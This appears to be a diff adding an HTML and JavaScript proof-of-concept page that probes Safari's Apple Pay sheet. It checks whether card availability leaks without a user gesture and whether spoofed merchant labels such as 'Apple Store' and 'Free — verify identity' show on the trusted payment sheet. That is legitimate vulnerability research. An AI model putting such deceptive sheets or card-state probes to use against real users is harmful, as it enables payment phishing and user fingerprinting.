@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC R3 - Apple Pay Sheet Probe</title>
+<style>
+  body{font-family:-apple-system,Helvetica,Arial,sans-serif;margin:0;padding:12px;background:#f2f2f7;color:#111}
+  h1{font-size:17px;margin:0 0 2px}
+  h2{font-size:14px;margin:16px 0 6px;border-top:1px solid #ddd;padding-top:10px}
+  .sub{font-size:12px;color:#666;margin:0 0 8px}
+  label{font-size:12px;display:block;margin:6px 0 2px}
+  input{width:100%;box-sizing:border-box;padding:8px;font-size:13px;border:1px solid #ccc;border-radius:8px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:8px}
+  button{padding:12px 6px;font-size:12px;border:none;border-radius:8px;background:#007aff;color:#fff}
+  button.pay{background:#000;grid-column:1/3;font-size:14px;font-weight:600}
+  button.warn{background:#ff9500}
+  #log{background:#000;color:#0f0;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:8px;border-radius:8px;height:200px;overflow:auto;white-space:pre-wrap;margin-top:10px}
+</style>
+</head>
+<body>
+<h1>Round 3 — Apple Pay Sheet Probe</h1>
+<p class="sub">Origin/label attribution + availability leak on the Apple Pay sheet. When embedded cross-origin (open via wrapper.html on domain A), the sheet SHOULD show the top origin. Bug = it shows the wrong origin, or attacker-controlled labels appear on the trusted sheet, or availability/card state leaks with no gesture in a 3rd-party context.</p>
+
+<h2>1 · Availability / privacy leak (no gesture, no merchant)</h2>
+<div class="grid">
+  <button onclick="feature()">Feature detect</button>
+  <button onclick="canPay()">canMakePayments()</button>
+  <button onclick="activeCard()">canMakePaymentsWithActiveCard(merchantId)</button>
+  <button onclick="whereami()">Report frame/origin context</button>
+</div>
+
+<h2>2 · Sheet display (deceptive labels)</h2>
+<p class="sub">Edit the label/amount then trigger. These strings render on the OS-trusted sheet.</p>
+<label>Total label (merchant name area)</label>
+<input id="tlabel" value="Apple Store">
+<label>Total amount</label>
+<input id="tamt" value="0.00">
+<label>Line item label</label>
+<input id="litem" value="Free — verify identity">
+<div class="grid">
+  <button class="pay" onclick="showSheet('direct')">Trigger Apple Pay sheet</button>
+  <button class="warn" onclick="showSheet('redirect')">Sheet then redirect</button>
+  <button class="warn" onclick="showSheet('afternav')">Sheet after history push</button>
+</div>
+
+<div id="log"></div>
+<div class="grid" style="margin-top:8px">
+  <button onclick="navigator.clipboard.writeText(document.getElementById('log').textContent)">Copy log</button>
+  <button onclick="document.getElementById('log').textContent=''">Clear</button>
+</div>
+
+<script>
+const logEl=document.getElementById('log');
+const ts=()=>new Date().toISOString().substr(11,12);
+const log=m=>{logEl.textContent+=`[${ts()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight};
+const MERCHANT='merchant.com.example'; // placeholder; real bug needs a registered id
+
+function feature(){
+  log('ApplePaySession in window: '+('ApplePaySession'in window));
+  if('ApplePaySession'in window){
+    for(let v=1;v<=14;v++){try{if(ApplePaySession.supportsVersion(v))log('  supportsVersion '+v);}catch(e){}}
+  }
+  log('PaymentRequest in window: '+('PaymentRequest'in window));
+}
+function canPay(){
+  try{const r=ApplePaySession.canMakePayments();log('canMakePayments() = '+r+'  (leaks Apple Pay availability, no gesture)');}
+  catch(e){log('canMakePayments err '+e.name+' '+e.message);}
+}
+function activeCard(){
+  try{ApplePaySession.canMakePaymentsWithActiveCard(MERCHANT).then(r=>log('activeCard('+MERCHANT+') = '+r+'  (leaks whether user has a provisioned card!)')).catch(e=>log('activeCard rejected '+e));}
+  catch(e){log('activeCard err '+e.name+' '+e.message);}
+}
+function whereami(){
+  log('origin = '+location.origin);
+  log('top-level? '+(window.top===window.self));
+  try{log('referrer = '+document.referrer);}catch(e){}
+  log('secure = '+window.isSecureContext);
+}
+
+function buildRequest(){
+  return {
+    countryCode:'US',currencyCode:'USD',
+    supportedNetworks:['visa','masterCard','amex'],
+    merchantCapabilities:['supports3DS'],
+    total:{label:document.getElementById('tlabel').value,amount:document.getElementById('tamt').value},
+    lineItems:[{label:document.getElementById('litem').value,amount:document.getElementById('tamt').value}]
+  };
+}
+function showSheet(mode){
+  log('=== show sheet ('+mode+') ===');
+  if(!('ApplePaySession'in window)){log('  ApplePaySession unavailable');return;}
+  let session;
+  try{session=new ApplePaySession(3,buildRequest());}
+  catch(e){log('  constructor threw: '+e.name+' '+e.message);return;}
+  session.onvalidatemerchant=(ev)=>{
+    log('  onvalidatemerchant fired -> SHEET IS SHOWING. validationURL='+ev.validationURL);
+    log('  (no backend/merchant cert -> will abort, but note what the sheet displayed: origin + labels)');
+    try{session.abort();}catch(e){}
+  };
+  session.oncancel=()=>log('  sheet cancelled/dismissed');
+  session.onpaymentmethodselected=()=>{try{session.completePaymentMethodSelection({newTotal:buildRequest().total,newLineItems:buildRequest().lineItems});}catch(e){}};
+  try{
+    session.begin();
+    log('  begin() called — sheet should appear now. CHECK: which origin/domain does it show?');
+  }catch(e){log('  begin() threw: '+e.name+' '+e.message);return;}
+  if(mode==='redirect'){setTimeout(()=>{log('  redirecting while sheet up...');location.href='https://apple.com';},600);}
+  if(mode==='afternav'){history.pushState({},'','?paid=1');log('  pushed history state under the sheet');}
+}
+log('ready. Open via wrapper.html (domain A) to test cross-origin sheet origin.');
+whereami();
+</script>
+</body>
+</html>
